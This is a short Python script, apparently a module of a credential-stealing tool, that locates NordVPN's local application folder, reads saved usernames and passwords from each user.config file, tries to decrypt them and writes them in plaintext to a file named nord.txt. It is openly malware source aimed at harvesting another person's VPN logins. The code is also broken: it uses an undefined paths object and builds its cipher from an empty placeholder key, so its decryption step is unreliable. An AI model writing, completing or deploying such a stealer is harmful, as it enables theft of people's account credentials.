import os
import xml.etree.ElementTree as ET
from pathlib import Path
from cryptography.fernet import Fernet

nord_vpn_dir = Path(os.path.join(Paths.lappdata, "NordVPN"))

if not nord_vpn_dir.exists():
    exit()

try:
    accounts = []

    for nord_vpn_exe_dir in nord_vpn_dir.glob("NordVpn.exe*"):
        for vpn_version_dir in nord_vpn_exe_dir.iterdir():
            user_config_path = vpn_version_dir / "user.config"

            if not user_config_path.exists():
                continue

            tree = ET.parse(user_config_path)
            root = tree.getroot()

            encoded_username = root.find(".//setting[@name='Username']/value")
            encoded_password = root.find(".//setting[@name='Password']/value")

            if encoded_username is not None and encoded_password is not None:
                encoded_username = encoded_username.text
                encoded_password = encoded_password.text

                key = b''  # Fill in the key used for decryption
                cipher_suite = Fernet(key)
                username = cipher_suite.decrypt(encoded_username.encode()).decode()
                password = cipher_suite.decrypt(encoded_password.encode()).decode()

                accounts.append(f"Username: {username}\nPassword: {password}\n")

    if accounts:
        output_path = os.path.join(os.getcwd(), "nord.txt")
        with open(output_path, "w") as output_file:
            output_file.write("".join(accounts))
except Exception as e:
    # Handle exceptions here
    print("An error occurred:", str(e))
